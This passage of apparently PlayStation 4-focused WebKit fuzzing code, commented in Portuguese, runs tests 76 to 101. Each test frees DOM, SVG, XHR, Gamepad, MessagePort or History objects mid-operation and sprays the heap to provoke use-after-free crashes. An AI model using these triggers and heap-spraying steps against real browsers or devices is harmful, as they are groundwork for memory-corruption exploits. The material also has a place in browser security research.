                // ForwardDelete dispara mutação. O observer pega.
                // Mas o Selection.modify é chamado internamente para ajustar o cursor.
                document.execCommand('forwardDelete');
                
                log("Tentando Selection.modify em nó morto...");
                sel.modify('move', 'forward', 'character');
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 76: Style Sheet Thrashing (UAF) ---
        // Técnica: Habilitar e desabilitar folhas de estilo força a reconstrução
        // da RenderTree. Se fizermos isso enquanto acessamos `computedStyle`,
        // podemos acessar um objeto RenderStyle que foi liberado.
        function runTest76() {
            log("Iniciando Test 76: Sheet Thrashing...");
            
            let style = document.createElement('style');
            style.textContent = "div { width: 100px; transition: all 1s; }";
            document.head.appendChild(style);
            
            let div = document.createElement('div');
            document.body.appendChild(div);
            
            // Loop de Thrashing
            let count = 0;
            let interval = setInterval(() => {
                count++;
                if (count > 20) { clearInterval(interval); log("Fim do Thrashing."); return; }
                
                // Desabilita estilo (Destroi RenderObjects)
                style.disabled = true;
                
                // Força leitura de estilo (Deve retornar padrão)
                let s1 = getComputedStyle(div).width;
                
                // Habilita (Recria RenderObjects)
                style.disabled = false;
                
                // AGRESSIVO: Removemos o elemento enquanto o estilo está sendo reaplicado
                if (count === 10) {
                    log("Removendo elemento no meio do ciclo...");
                    div.remove();
                    sprayHeap();
                }
                
                // Tenta ler estilo do elemento removido com folha re-habilitada
                try {
                    let s2 = getComputedStyle(div).width;
                } catch(e) {}
                
            }, 10); // 10ms é rápido o suficiente para estressar a thread UI
        }

        // --- TESTE 77: Form 'Invalid' Event Destruction ---
        // Técnica: O método `checkValidity()` dispara eventos 'invalid' em elementos
        // que não satisfazem as regras. O evento é síncrono.
        // Se destruirmos o formulário no primeiro evento, o loop de validação
        // (que percorre todos os campos) vai falhar nos próximos?
        function runTest77() {
            log("Iniciando Test 77: Form Validation...");
            
            let form = document.createElement('form');
            let i1 = document.createElement('input'); i1.required = true;
            let i2 = document.createElement('input'); i2.required = true;
            let i3 = document.createElement('input'); i3.required = true;
            
            form.appendChild(i1);
            form.appendChild(i2);
            form.appendChild(i3);
            document.body.appendChild(form);
            
            i1.addEventListener('invalid', function() {
                log("Input 1 Inválido! Destruindo formulário...");
                // O navegador tem uma lista [i1, i2, i3] para validar.
                // Estamos no i1.
                form.remove();
                
                // Removemos os campos individualmente para garantir
                i2.remove();
                i3.remove();
                
                sprayHeap();
            });

            try {
                log("Validando...");
                // checkValidity itera sobre os controles.
                // Se não verificar se o form ainda está conectado a cada passo, crash.
                form.checkValidity();
                log("Validação segura.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 78: Details 'Toggle' Event Loop ---
        // Técnica: O elemento `<details>` dispara 'toggle' quando aberto/fechado.
        // Isso envolve criação/destruição de layout (renderer).
        // Se forçarmos um loop de toggle dentro do evento toggle, estouramos a pilha?
        // Ou se destruirmos o elemento durante o toggle?
        function runTest78() {
            log("Iniciando Test 78: Details Toggle...");
            
            let det = document.createElement('details');
            let sum = document.createElement('summary');
            sum.innerText = "Click";
            det.appendChild(sum);
            det.appendChild(document.createElement('div')); // Conteúdo
            document.body.appendChild(det);

            let toggles = 0;
            det.addEventListener('toggle', function() {
                toggles++;
                log(`Toggle ${toggles}! Estado: ${det.open}`);
                
                if (toggles === 1) {
                    log("Dentro do toggle 1. Destruindo elemento...");
                    
                    // O navegador está processando a abertura (criando layout).
                    // Nós removemos o elemento.
                    det.remove();
                    sprayHeap();
                    
                    // Tenta forçar acesso a propriedades de layout do elemento morto
                    try {
                        let h = det.offsetHeight;
                        log("Altura pós-morte: " + h);
                        
                        // Tenta inverter o estado novamente em objeto desconectado
                        det.open = !det.open;
                    } catch(e) { log("Erro: " + e); }
                }
            });

            log("Abrindo details...");
            det.open = true; // Dispara toggle
        }
 // --- TESTE 79: ARIA 'aria-owns' Cycle UAF ---
        // Técnica: Acessibilidade. O atributo 'aria-owns' rearranja a árvore AX.
        // Se criarmos um ciclo (Pai possui Filho, Filho possui Pai) e destruirmos
        // um deles durante o cálculo da árvore, o WebKit pode crashar.
        function runTest79() {
            log("Iniciando Test 79: ARIA Cycle...");
            
            let parent = document.createElement('div');
            parent.id = "parent";
            parent.setAttribute("role", "group");
            
            let child = document.createElement('div');
            child.id = "child";
            child.setAttribute("role", "button");
            
            parent.appendChild(child);
            document.body.appendChild(parent);

            // Trigger: Ciclo de propriedade
            // Pai diz que possui o filho (normal)
            parent.setAttribute("aria-owns", "child");
            
            // Força atualização da AX Tree (acessando computedName ou role)
            let ax = parent.computedName;

            log("Criando ciclo AX...");
            
            // AGORA: Filho diz que possui o pai (Ciclo ilegal)
            child.setAttribute("aria-owns", "parent");

            // No meio da confusão, removemos o pai
            // O WebKit tenta resolver o ciclo infinito na árvore AX.
            // Se ele não checar ponteiros nulos/mortos durante a resolução...
            parent.remove();
            sprayHeap();
            
            try {
                // Tenta forçar o navegador a ler a árvore quebrada
                document.body.setAttribute("aria-controls", "child");
                log("Ciclo injetado.");
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 80: IntersectionObserver Lifetime Race ---
        // Técnica: Observers mantêm referências "fracas" ou complexas.
        // Observamos um elemento. No callback, destruímos o elemento e
        // desconectamos o observer.
        function runTest80() {
            log("Iniciando Test 80: IntersectionObserver...");
            
            if (!window.IntersectionObserver) { log("API ausente."); return; }

            let target = document.createElement('div');
            target.style.height = "100px";
            target.style.background = "red";
            document.body.appendChild(target);

            let observer = new IntersectionObserver((entries) => {
                log("Observer disparado! Destruindo alvo...");
                
                // O WebKit está processando a lista de entradas.
                // Nós destruímos o alvo e tentamos corromper a lista interna.
                target.remove();
                target = null;
                
                observer.disconnect();
                sprayHeap();
                
                // Tenta forçar GC (simulado com alocação massiva)
                let temp = []; 
                for(let i=0; i<10000; i++) temp.push({a:i});
            });

            observer.observe(target);
            
            // Força layout para garantir que o observer dispare (visibilidade muda)
            document.body.offsetHeight;
            window.scrollBy(0, 1);
        }

        // --- TESTE 81: CSS Variable Cyclic Dependency Crash ---
        // Técnica: Variáveis CSS podem referenciar a si mesmas.
        // Ciclos profundos causam Stack Overflow ou corrupção na engine de estilo.
        // Removemos o elemento enquanto a engine tenta resolver o valor da variável.
        function runTest81() {
            log("Iniciando Test 81: CSS Var Cycle...");
            
            let div = document.createElement('div');
            div.style.setProperty('--a', 'var(--b)');
            div.style.setProperty('--b', 'var(--a)'); // Ciclo direto
            
            // Ciclo complexo para estressar a recursão
            let styles = "";
            for(let i=0; i<100; i++) {
                styles += `--v${i}: var(--v${i+1}); `;
            }
            styles += `--v100: var(--v0);`; // Fecha o loop
            
            div.style.cssText = styles;
            document.body.appendChild(div);

            // Tenta ler o valor computado. Isso dispara o resolver.
            // Precisamos interromper. Como CSS é síncrono, usamos um Proxy ou 
            // evento de layout se possível. Aqui, tentamos stressar o parser.
            
            try {
                log("Resolvendo variáveis cíclicas...");
                let val = getComputedStyle(div).getPropertyValue('--v0');
                log("Resolvido (Seguro): " + val);
                
                // Se não crashou, vamos tentar destruir durante o parse
                // Usando um iframe para isolar o crash
                let iframe = document.createElement('iframe');
                document.body.appendChild(iframe);
                let d = iframe.contentDocument.createElement('div');
                d.style.cssText = styles;
                iframe.contentDocument.body.appendChild(d);
                
                // Remove o iframe enquanto ele calcula
                iframe.remove();
                sprayHeap();
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 82: SVG 'use' Shadow Tree Re-Entrancy ---
        // Técnica: Elementos <use> clonam árvores. Se o original contiver
        // um script (via <foreignObject> ou similar) que altera o original
        // DURANTE a clonagem, o clone fica inconsistente.
        function runTest82() {
            log("Iniciando Test 82: SVG Use Re-Entrancy...");
            
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            let defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
            let g = document.createElementNS("http://www.w3.org/2000/svg", "g");
            g.id = "target";
            
            // Adiciona um objeto que tentaremos usar como gatilho (embora script em SVG seja restrito,
            // o processo de construção da shadow tree é vulnerável a mutações DOM)
            let rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
            rect.setAttribute("width", "100");
            rect.setAttribute("height", "100");
            g.appendChild(rect);
            
            defs.appendChild(g);
            svg.appendChild(defs);
            
            let use = document.createElementNS("http://www.w3.org/2000/svg", "use");
            use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
            
            // Armadilha: MutationObserver na shadow root do use (User Agent Shadow Root)
            // Normalmente inacessível, mas podemos observar o original 'g'
            // Se o browser sincronizar alterações...
            
            svg.appendChild(use);
            document.body.appendChild(svg);
            
            log("Mutando original pós-clonagem...");
            
            // Modifica o original drasticamente
            g.innerHTML = ""; 
            sprayHeap();
            
            // Força re-renderização do 'use'
            // Se o WebKit tentar atualizar a shadow tree acessando o 'g' original que mudou...
            try {
                let box = use.getBBox();
                log("BBox: " + box.x);
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 83: Slot Element Assignment Confusion ---
        // Técnica: Shadow DOM v1 usa <slot>. Atribuir nós a slots e remover
        // os slots causa recálculo de distribuição.
        // Se fizermos isso dentro de um evento 'slotchange'.
        function runTest83() {
            log("Iniciando Test 83: Slot Assignment...");
            
            if (!document.body.attachShadow) { log("ShadowDOM v1 ausente."); return; }

            let host = document.createElement('div');
            let shadow = host.attachShadow({mode: 'open'});
            
            let slot = document.createElement('slot');
            slot.name = "s1";
            shadow.appendChild(slot);
            
            let child = document.createElement('div');
            child.slot = "s1";
            host.appendChild(child);
            document.body.appendChild(host);

            slot.addEventListener('slotchange', () => {
                log("Slot mudou! Destruindo slot...");
                // O navegador acabou de atribuir 'child' ao 'slot'.
                // Nós removemos o slot da shadow tree.
                // O 'child' deve voltar a ser não-distribuído.
                slot.remove();
                
                // Removemos também o host para garantir chaos
                host.remove();
                
                sprayHeap();
            });

            log("Triggering slot change...");
            // Adicionar outro filho deve disparar o evento
            let child2 = document.createElement('span');
            child2.slot = "s1";
            host.appendChild(child2);
        }
// --- TESTE 84: Template Content Adoption Cycle ---
        // Lógica: <template> tem um 'content' (DocumentFragment) que pertence a um documento null/inerte.
        // Adotar esse conteúdo para o documento principal envolve mudar o 'ownerDocument' de todos os filhos.
        // Se interrompermos esse processo recursivo...
        function runTest84() {
            log("Iniciando Test 84: Template Adoption...");
            
            let temp = document.createElement('template');
            // Cria estrutura profunda dentro do template
            temp.innerHTML = "<div><span><b><i id='target'>Deep</i></b></span></div>";
            
            let content = temp.content; // DocumentFragment inerte
            let target = content.getElementById('target');
            
            // Mutation Observer no fragmento do template (Raro de se testar)
            let observer = new MutationObserver(() => {
                log("Observer no Template disparado! Limpando template...");
                // Esvazia o conteúdo do template enquanto ele está sendo clonado/adotado
                temp.innerHTML = "";
                sprayHeap();
            });
            
            observer.observe(content, { childList: true, subtree: true });
            
            try {
                log("Importando nó do template...");
                // importNode faz uma cópia profunda.
                // O observer pode não disparar na cópia, mas...
                // E se movermos?
                let moved = document.adoptNode(content);
                log("Adoção finalizada.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 85: Dataset (DOMStringMap) Proxy UAF ---
        // Lógica: 'element.dataset' retorna um Proxy (DOMStringMap).
        // Modificar esse proxy chama 'setAttribute' no elemento C++.
        // Se destruirmos o elemento, o Proxy ainda mantém referência ao objeto C++ destruído?
        function runTest85() {
            log("Iniciando Test 85: Dataset Proxy...");
            
            let div = document.createElement('div');
            document.body.appendChild(div);
            
            let ds = div.dataset;
            ds.test = "init";
            
            // Armadilha: MutationObserver em atributos
            let observer = new MutationObserver(() => {
                log("Atributo mudou via Dataset. Destruindo elemento...");
                div.remove();
                div = null;
                sprayHeap();
            });
            observer.observe(div, { attributes: true });
            
            log("Escrevendo no Dataset (Trigger)...");
            try {
                // Isso dispara setAttribute -> Observer -> Remove Div
                // O Proxy 'ds' tenta continuar a operação no ponteiro do Div
                ds.attack = "payload";
                
                log("Escrita 1 feita.");
                
                // Tenta escrever de novo usando a referência 'ds' que aponta para o Div morto
                ds.afterdeath = "crash"; 
                log("Escrita pós-morte feita (Perigo).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 86: XHR ResponseType Confusion Race ---
        // Lógica: Mudar 'responseType' limpa buffers internos.
        // Fazer isso *durante* o recebimento de dados (readystatechange) pode confundir
        // o parser interno sobre qual tipo de buffer ele deve escrever.
        function runTest86() {
            log("Iniciando Test 86: XHR Type Confusion...");
            
            let xhr = new XMLHttpRequest();
            // Usa um arquivo grande do próprio sistema ou blob local
            let blob = new Blob([new Uint8Array(1024*1024*5).fill(0x41)]);
            let url = URL.createObjectURL(blob);
            
            xhr.open("GET", url, true);
            
            // Começa como texto
            xhr.responseType = "text";
            
            xhr.onreadystatechange = function() {
                // Estado 3: LOADING (Recebendo dados parciais)
                if (xhr.readyState === 3) {
                    try {
                        log("Estado LOADING. Trocando para 'arraybuffer'...");
                        // O WebKit odeia trocar isso no meio do download.
                        // Mas se ele permitir (ou falhar em bloquear corretamente)...
                        xhr.responseType = "arraybuffer";
                        
                        // Tenta ler a resposta parcial imediatamente com o tipo errado
                        let r = xhr.response;
                        log("Resposta lida: " + (r ? r.byteLength : "null"));
                    } catch(e) {
                        // Ignora erros de "InvalidStateError", buscamos crash
                    }
                }
            };
            
            xhr.onload = function() {
                 log("Download fim. Tipo final: " + xhr.responseType);
                 sprayHeap();
            };
            
            xhr.send();
        }

        // --- TESTE 87: FontFaceSet Iterator Invalidation ---
        // Lógica: `document.fonts` é iterável.
        // Iterar sobre um Set enquanto o modificamos (clear/delete) é perigoso em C++.
        // O iterador pode apontar para um bloco de memória que foi liberado.
        function runTest87() {
            log("Iniciando Test 87: Font Iterator...");
            
            // Adiciona fontes falsas
            for(let i=0; i<50; i++) {
                let f = new FontFace(`F${i}`, 'url(data:...)');
                document.fonts.add(f);
            }
            
            log("Iterando fontes...");
            let count = 0;
            try {
                // Itera usando 'for..of' (usa o iterador C++ interno)
                for (let font of document.fonts) {
                    count++;
                    if (count === 10) {
                        log("Limpando Set no meio da iteração!");
                        document.fonts.clear(); // Destroi o backing store do Set
                        sprayHeap();
                        
                        // Adiciona lixo para tentar corromper o ponteiro do iterador
                        document.fonts.add(new FontFace('Evil', 'url(data:...)'));
                    }
                }
                log("Iteração sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 88: SVG SMIL Animation Target Death ---
        // Lógica: SMIL (<animate>) atualiza atributos frame a frame.
        // Se removermos o alvo da animação, mas a animação continuar rodando,
        // o motor de animação tenta escrever no atributo do nó morto?
        function runTest88() {
            log("Iniciando Test 88: SVG SMIL Death...");
            
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            
            let rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
            rect.id = "anim-target";
            rect.setAttribute("width", "100");
            rect.setAttribute("height", "100");
            
            let anim = document.createElementNS("http://www.w3.org/2000/svg", "animate");
            anim.setAttribute("attributeName", "width");
            anim.setAttribute("from", "100");
            anim.setAttribute("to", "500");
            anim.setAttribute("dur", "5s");
            anim.setAttribute("repeatCount", "indefinite");
            
            rect.appendChild(anim); // Animação filha do rect
            svg.appendChild(rect);
            document.body.appendChild(svg);
            
            // Inicia relógio
            setTimeout(() => {
                log("Animação deve estar rodando. Removendo alvo...");
                
                // Remove o retângulo (o alvo da animação)
                rect.remove();
                // Remove a referência JS
                rect = null; 
                
                sprayHeap();
                
                // A animação SMIL roda num timer interno. 
                // Esperamos alguns frames para ver se o timer acessa o ponteiro morto.
                log("Aguardando frames de animação...");
                
            }, 500);
            
            setTimeout(() => {
                log("Teste 88 finalizado (Sem crash visível).");
                svg.remove();
            }, 2000);
        }
// --- TESTE 89: Normalize() Text Merge Trap ---
        // Lógica: 'normalize()' funde nós de texto adjacentes.
        // Isso dispara eventos de mutação (DOMCharacterDataModified ou DOMNodeRemoved).
        // Se no meio da fusão nós removermos o nó pai, o ponteiro de fusão se perde?
        function runTest89() {
            log("Iniciando Test 89: Normalize Trap...");
            
            let div = document.createElement('div');
            let t1 = document.createTextNode("A");
            let t2 = document.createTextNode("B");
            let t3 = document.createTextNode("C");
            
            div.appendChild(t1);
            div.appendChild(t2);
            div.appendChild(t3);
            document.body.appendChild(div);

            // Armadilha: Monitora a remoção de nós (causada pela fusão)
            let observer = new MutationObserver((mutations) => {
                log("Observer: Normalize iniciou fusão...");
                // O navegador está fundindo t2 em t1 e removendo t2.
                // Nós destruímos o DOM inteiro agora.
                div.remove(); 
                t1 = null; t2 = null; t3 = null;
                sprayHeap();
            });
            
            observer.observe(div, { childList: true });

            try {
                log("Chamando normalize()...");
                // Isso deve iniciar a cadeia de eventos
                div.normalize();
                log("Normalize finalizado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 90: Selection.extend() DOM Mutation ---
        // Lógica: 'extend' move o foco da seleção. O navegador precisa calcular
        // o novo range. Se movermos o nó de âncora *enquanto* estendemos...
        function runTest90() {
            log("Iniciando Test 90: Selection Extend...");
            
            let p = document.createElement('p');
            p.innerHTML = "Texto <b>Negrito</b> <i>Italico</i> Fim";
            document.body.appendChild(p);
            
            let sel = window.getSelection();
            let range = document.createRange();
            range.setStart(p.firstChild, 0);
            range.collapse(true);
            sel.removeAllRanges();
            sel.addRange(range);

            log("Extendendo seleção...");
            
            // Usamos um evento 'selectionchange' se disponível, ou loop de força
            // Mas 'extend' é síncrono. Como interromper?
            // Usamos um Getter malicioso num objeto que pode ser acessado durante o processo?
            // Ou apenas race condition de layout se houver repaint.
            
            // Tentativa: Alterar DOM logo antes de chamar extend, esperando que o layout esteja sujo
            p.lastChild.remove(); // Remove 'Fim'
            
            try {
                // Tenta estender até um nó que acabamos de remover ou cujo layout mudou
                // O offset 10 pode estar fora dos limites agora
                sel.extend(p, 1); 
                log("Extend OK.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 91: CSS 'content' Counter Layout Loop ---
        // Lógica: Usar contadores CSS para gerar conteúdo infinito ou recursivo
        // e forçar leitura de layout. O 'content' gerado cria RenderObjects anônimos.
        function runTest91() {
            log("Iniciando Test 91: CSS Counter Loop...");
            
            let style = document.createElement('style');
            // Regra recursiva ou complexa
            style.textContent = `
                #host { counter-reset: c; }
                #host::before { 
                    content: counter(c); 
                    counter-increment: c;
                }
                #host:empty {
                     /* Muda estilo se vazio */
                     display: inline;
                }
            `;
            document.head.appendChild(style);
            
            let host = document.createElement('div');
            host.id = "host";
            document.body.appendChild(host);
            
            // Força layout
            host.offsetHeight;
            
            log("Destruindo host e forçando reflow...");
            
            // Remove o host e imediatamente tenta acessar propriedades de estilo computado
            // que dependem dos contadores globais
            host.remove();
            sprayHeap();
            
            try {
                // Tenta acessar estilo de pseudo-elemento em nó desconectado
                let content = getComputedStyle(host, '::before').content;
                log("Content lido: " + content);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 92: Form NamedItem Getter Destruction ---
        // Lógica: Formulários permitem acessar inputs pelo nome (form.inputName).
        // Isso é um getter. Se definirmos um input com nome conflitante e removermos
        // enquanto acessamos...
        function runTest92() {
            log("Iniciando Test 92: Form NamedItem...");
            
            let form = document.createElement('form');
            let input = document.createElement('input');
            input.setAttribute('name', 'boom');
            form.appendChild(input);
            document.body.appendChild(form);
            
            // Acessa uma vez para cachear
            let x = form.boom;
            
            // Agora, define um getter no protótipo ou tenta interceptar
            // Mas melhor: Race condition simples.
            // Remove o input e acessa a propriedade 'boom' no form imediatamente.
            // O form pode tentar buscar na cache interna de controles que agora tem ponteiro morto.
            
            input.remove();
            sprayHeap();
            
            try {
                let y = form.boom; // Acesso ao item removido via cache do form
                log("Acesso pós-remoção: " + y);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 93: Range.insertNode() Hierarchy Cycle ---
        // Lógica: Tentar inserir um nó que cria um ciclo na árvore (o nó contém o range?).
        // O WebKit verifica ciclos, mas se modificarmos a árvore durante a verificação...
        function runTest93() {
            log("Iniciando Test 93: Range Insert Cycle...");
            
            let div = document.createElement('div');
            let span = document.createElement('span');
            div.appendChild(span);
            document.body.appendChild(div);
            
            let range = document.createRange();
            range.setStart(div, 0);
            range.setEnd(div, 1);
            
            let newNode = document.createElement('div');
            // newNode contém o div pai? Não, impossível inserir.
            // Mas e se inserirmos newNode, e no evento de inserção movermos o div pai PARA DENTRO de newNode?
            
            newNode.addEventListener('DOMNodeInserted', function() {
                log("Inserção detectada! Criando ciclo...");
                try {
                    // Move o pai (div) para dentro do filho (newNode) que está sendo inserido nele
                    newNode.appendChild(div);
                    sprayHeap();
                } catch(e) {
                    log("Ciclo bloqueado: " + e.message);
                }
            });
            
            try {
                log("Inserindo nó...");
                range.insertNode(newNode);
                log("Inserção OK.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
// --- TESTE 94: Gamepad Object UAF ---
        // Lógica: O PS4 tem suporte nativo a Gamepad. 'navigator.getGamepads()' retorna objetos vivos.
        // Se desconectarmos (simulado via iframe) enquanto acessamos propriedades...
        function runTest94() {
            log("Iniciando Test 94: Gamepad API...");
            
            if (!navigator.getGamepads) { log("Gamepad API ausente."); return; }

            // Cria um iframe para isolar o contexto do Gamepad
            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            
            // Tenta obter gamepads no contexto do iframe
            let pads = iframe.contentWindow.navigator.getGamepads();
            if (!pads || pads.length === 0 || !pads[0]) {
                log("Nenhum gamepad detectado. Pressione um botão no controle!");
                // Tenta continuar mesmo sem pad, caso a API retorne objeto vazio que possamos corromper
            } else {
                log("Gamepad detectado: " + pads[0].id);
            }

            // Loop de acesso agressivo
            let loop = setInterval(() => {
                try {
                    // Acessa propriedades repetidamente
                    let gp = iframe.contentWindow.navigator.getGamepads()[0];
                    if (gp) {
                        let x = gp.axes[0];
                        let y = gp.buttons[0].pressed;
                    }
                } catch(e) {}
            }, 10);

            // Destroi o contexto do iframe abruptamente
            setTimeout(() => {
                log("Destruindo contexto do Gamepad...");
                clearInterval(loop);
                iframe.remove();
                sprayHeap();
                
                // Tenta acessar o objeto 'pads' que salvamos do iframe morto
                try {
                    log("Acesso pós-morte: " + pads.length);
                    if (pads[0]) log("Axes: " + pads[0].axes.length);
                } catch(e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        // --- TESTE 95: MessagePort Transfer Getter Trap ---
        // Lógica: 'postMessage' serializa objetos. Se passarmos um objeto com getter
        // na lista de transferência, e esse getter fechar a porta sendo transferida...
        function runTest95() {
            log("Iniciando Test 95: MessagePort Trap...");
            
            let channel = new MessageChannel();
            let port1 = channel.port1;
            let port2 = channel.port2;

            let obj = {};
            // O getter será chamado quando o navegador tentar ler o objeto para enviar
            Object.defineProperty(obj, 'trap', {
                get: function() {
                    log("Getter disparado durante postMessage!");
                    // Fecha a porta que está sendo transferida (port1)
                    port1.close();
                    port2.close();
                    sprayHeap();
                    return "payload";
                }
            });

            try {
                // Envia 'obj' e transfere 'port1'. 
                // O navegador verifica a lista de transferência, depois serializa 'obj'.
                // Se a ordem for Serializa -> Verifica Transferable, podemos fechar a porta no meio.
                port2.postMessage(obj, [port1]);
                log("Mensagem enviada.");
            } catch(e) {
                log("Erro (Safe): " + e.message);
            }
        }

        // --- TESTE 96: deleteFromDocument Selection Crash ---
        // Lógica: Similar a 'deleteContents', mas específico da API Selection.
        // Remove o range da árvore. Se usarmos MutationObserver para interferir...
        function runTest96() {
            log("Iniciando Test 96: deleteFromDocument...");
            
            let div = document.createElement('div');
            div.innerHTML = "<span>Texto 1</span><span>Texto 2</span>";
            document.body.appendChild(div);
            
            let sel = window.getSelection();
            sel.selectAllChildren(div);
            
            let observer = new MutationObserver(() => {
                log("Observer: Seleção sendo deletada...");
                // O navegador está iterando os filhos para remover.
                // Nós removemos o pai de todos.
                div.remove();
                sprayHeap();
            });
            observer.observe(div, {childList: true, subtree: true});
            
            try {
                log("Executando deleteFromDocument...");
                sel.deleteFromDocument();
                log("Comando finalizado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 97: Canvas.toBlob() Destruction Race ---
        // Lógica: 'toBlob' é assíncrono (codifica PNG/JPG em thread separada).
        // Se destruirmos o canvas (e seu backing store) antes do callback...
        function runTest97() {
            log("Iniciando Test 97: Canvas toBlob Race...");
            
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = 'red';
            ctx.fillRect(0,0,100,100);
            
            log("Iniciando toBlob...");
            
            canvas.toBlob(function(blob) {
                log("Callback toBlob executado.");
                // Verifica se o blob é válido
                if (blob) log("Blob size: " + blob.size);
                
                // Se o canvas foi destruído, o blob veio de onde? Memória liberada?
                if (blob && blob.size > 0) {
                     // Tenta ler o blob para ver se tem lixo
                     let fr = new FileReader();
                     fr.onload = () => log("Blob read ok.");
                     fr.readAsArrayBuffer(blob);
                }
            });
            
            // Destroi canvas imediatamente
            log("Destruindo canvas...");
            canvas.width = 0; // Zera buffer
            canvas = null;
            ctx = null;
            sprayHeap();
        }

        // --- TESTE 98: MatchMedia Listener Detach ---
        // Lógica: MatchMedia adiciona listeners que reagem a mudanças de sistema.
        // Se o documento for destruído (iframe removido), o listener deve morrer.
        // Se o sistema tentar notificar um listener morto...
        function runTest98() {
            log("Iniciando Test 98: MatchMedia Detach...");
            
            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            
            let mql = iframe.contentWindow.matchMedia('(min-width: 500px)');
            
            mql.addListener(function(e) {
                log("Media Query mudou! (Isso não deveria acontecer se o iframe morreu)");
            });
            
            log("Removendo Iframe...");
            iframe.remove();
            sprayHeap();
            
            // Tenta forçar uma atualização de estilo/media query no sistema
            // Não podemos redimensionar a janela do PS4, mas podemos tentar criar pressão
            try {
                // Cria novo iframe para forçar recálculo de layout global
                let f2 = document.createElement('iframe');
                document.body.appendChild(f2);
                f2.width = "100%";
                setTimeout(() => f2.remove(), 100);
            } catch(e) {}
            
            // Tenta acessar a query list do contexto morto
            try {
                log("MQL matches: " + mql.matches);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
 // --- TESTE 99: Serialized History State UAF ---
        // Lógica Complexa: O History API serializa objetos profundamente.
        // Criamos um objeto com um getter que, quando lido pelo serializador (C++),
        // navega para outra página ou limpa o histórico, invalidando o buffer de escrita.
        function runTest99() {
            log("Iniciando Test 99: History Ghost...");
            
            // Objeto complexo com Getter Armadilha
            let state = {
                a: new Uint8Array(1024),
                b: "test",
                get trap() {
                    log("Serializador acessou 'trap'! Corrompendo estado...");
                    
                    // 1. Força navegação/limpeza (Destroi o documento associado ao estado?)
                    // Tenta substituir o estado atual por algo nulo violentamente
                    try {
                        history.replaceState(null, "", "");
                    } catch(e) {}

                    // 2. Spray para sobrescrever o buffer de serialização antigo
                    sprayHeap('0xD0'); 
                    
                    return { x: 0x41414141 }; // Retorna lixo para ser escrito
                }
            };

            try {
                // history.pushState chama StructuredClone (Serializador)
                // O WebKit começa a ler 'state'. Quando chega em 'trap', rodamos o JS malicioso.
                history.pushState(state, "Crash", "?crash");
                log("Sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 100: Transferable ArrayBuffer Detach Race ---
        // Lógica Complexa: 'postMessage' permite transferir a posse de memória.
        // Se passarmos um objeto na lista de transferência que tem um getter,
        // e esse getter "neutra" (detaches) o ArrayBuffer *antes* do C++ processá-lo...
        function runTest100() {
            log("Iniciando Test 100: Transferable Race...");
            
            let channel = new MessageChannel();
            let ab = new ArrayBuffer(1024 * 1024); // 1MB Buffer
            
            // Objeto com getter na lista de transferência? Não, a lista é de objetos.
            // Mas podemos passar um objeto na MENSAGEM cujo getter manipula a lista?
            
            let payload = {
                get buf() {
                    log("Getter do payload! Detachando buffer...");
                    // Transfere o buffer para um Worker morto/inútil para esvaziá-lo
                    // Isso faz ab.byteLength = 0
                    try {
                        let w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/js'})));
                        w.postMessage(ab, [ab]); 
                    } catch(e) { log(e); }
                    
                    sprayHeap('0xFF');
                    return ab; // Retorna o buffer agora vazio/inválido
                }
            };

            try {
                // O WebKit serializa 'payload'. Lê 'payload.buf'.
                // O getter roda. O buffer é transferido (morre).
                // O getter retorna o buffer morto.
                // O WebKit tenta serializar o buffer morto ou transferi-lo novamente?
                channel.port1.postMessage(payload);
                log("Mensagem enviada.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 101: Cyclic SVG Filter Rendering Crash ---
        // Lógica Complexa: Filtros SVG podem referenciar outros filtros.
        // Criamos um ciclo (A -> B -> A). O renderizador geralmente detecta isso.
        // Mas se removermos 'B' do DOM *enquanto* 'A' está renderizando?
        function runTest101() {
            log("Iniciando Test 101: SVG Filter Cycle...");
            
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            let defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
            
            let f1 = document.createElementNS("http://www.w3.org/2000/svg", "filter");
            f1.id = "f1";
            let fe1 = document.createElementNS("http://www.w3.org/2000/svg", "feImage");
            fe1.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#f2"); // Aponta para F2
            f1.appendChild(fe1);

            let f2 = document.createElementNS("http://www.w3.org/2000/svg", "filter");
            f2.id = "f2";
            let fe2 = document.createElementNS("http://www.w3.org/2000/svg", "feImage");
            fe2.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#f1"); // Aponta para F1 (Ciclo)
            f2.appendChild(fe2);
            
            defs.appendChild(f1);
            defs.appendChild(f2);
            svg.appendChild(defs);
            
            let rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
            rect.setAttribute("filter", "url(#f1)"); // Aplica filtro
            rect.setAttribute("width", "100");
